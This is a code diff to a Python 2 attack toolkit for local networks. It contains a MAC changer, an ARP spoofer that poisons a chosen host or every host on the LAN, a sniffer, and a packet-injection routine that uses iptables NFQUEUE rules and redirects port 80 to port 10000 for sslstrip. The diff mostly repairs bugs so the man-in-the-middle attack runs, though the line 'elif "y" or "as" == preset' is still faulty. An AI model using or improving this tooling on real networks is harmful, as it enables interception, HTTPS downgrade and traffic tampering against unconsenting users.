@@ -6,6 +6,7 @@ import subprocess
 import re
 import time
 import sys
+import random
 
 PORT = 80
 NIC = "eth0"
@@ -24,7 +25,7 @@ def get_current_mac(nic):
     ifconfig_result = subprocess.check_output(["ifconfig", nic])
     mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
     if mac_address_search_result:
-        return mac_address_search_result.group(0)
+        return str(mac_address_search_result.group(0))
     else:
         print("[---] ERROR! Could not read the MAC-address")
         sys.exit()
@@ -39,7 +40,7 @@ def change_mac(nic, gen_mac):
 def mac_changer():
     global NIC
     NIC = raw_input("Write NIC (example: eth0): ")
-    gen_mac = gen_mac_address()
+    gen_mac = str(gen_mac_address())
     current_mac = get_current_mac(NIC)
     print("Current MAC-address is " + str(current_mac))
     if not current_mac == gen_mac:
@@ -151,14 +152,18 @@ def restore_arp_tables(dst_ip_list, src_ip_list):
 
 # THE MAIN FUNCTION TO SPOOF ARP-TABLES <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 def arp_spoofer():
+    interval_in_seconds = raw_input("Set prefer interval for arping in seconds (by default: 2): ") or str(2)
     spoof_cmd = raw_input("Do you want to get an arp-spoof for all hosts? (y/n or whatever you want to exit): ")
-    interval_in_seconds = raw_input("Set prefer interval for arping in seconds (by default: 2): ") | 2
+    if spoof_cmd not in ["y", "n"]:
+        sys.exit()
     presettings()
     gateway_ip = get_gateway_ip()
+    target_ip = ""
     try:
         if "n" == spoof_cmd:
             print_host_list(network_scanner(False))
             target_ip = raw_input("Choose an 'IP' showed above: ")
+            print("ARP-spoofing started:")
             start = time.time()
             while True:
                 spoof_arp_tables(target_ip, gateway_ip)
@@ -169,6 +174,7 @@ def arp_spoofer():
 
         elif "y" == spoof_cmd:
             target_ip = network_scanner(True)
+            print("ARP-spoofing started:")
             start = time.time()
             while True:
                 spoof_arp_tables(target_ip, gateway_ip)
@@ -176,10 +182,8 @@ def arp_spoofer():
                 print("\rTime (in seconds) left: " + str(time.time() - start)),
                 sys.stdout.flush()
                 time.sleep(int(interval_in_seconds))
-        else:
-            sys.exit()
     except (KeyboardInterrupt, BaseException), e:
-        print("WARNING! Something get wrong!... Resetting ARP-tables... Please wait...")
+        print("\nWARNING! Something get wrong!... Resetting ARP-tables... Please wait...")
         restore_arp_tables(target_ip, gateway_ip)
         restore_arp_tables(gateway_ip, target_ip)
         print("ARP-tables were resetting successfully!")
@@ -193,20 +197,20 @@ def traffic_sniffer():
     scapy.sniff(iface=nic, store=False, prn=sniffer_callback)
 # ================================= /For traffic_sniffer ========================================
 # ================================= /For code_injector ========================================
-def set_present():
-    opt = raw_input(
-        "To catch for modify: just transient/all&sslstrip/yours traffic (t/as/y, by default: 'y' or whatever you want for exit): ") | "y"
-    if "t" == opt:
+def set_presets():
+    preset = raw_input(
+        "To catch for modify: just transient/all&sslstrip/yours traffic (t/as/y, by default: 'y' or whatever you want for exit): ") or "y"
+    if "t" == preset:
         subprocess.call("iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
-    elif "y" | "as" == opt:
+    elif "y" or "as" == preset:
         subprocess.call("iptables -A INPUT -j NFQUEUE --queue-num 0", shell=True)
         subprocess.call("iptables -A OUTPUT -j NFQUEUE --queue-num 0", shell=True)
-        if "as" == opt:
+        if "as" == preset:
             raw_input("===>>> ALERT!!! Make sure you run 'sslstrip' before!!! (press any key to continue)")
             subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)
     else:
         sys.exit()
-    return opt
+    return preset
 
 def flush_presets():
     subprocess.call("iptables --flush", shell=True)
@@ -275,8 +279,8 @@ def callback_switch():
 
 # THE MAIN FUNCTION FOR PACKET MODIFICATION <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 def packet_modificator():
-    opt = set_presets()
-    if "as" == opt:
+    op = set_presets()
+    if "as" == op:
         global PORT
         PORT = 10000
     modifier_callback = callback_switch()
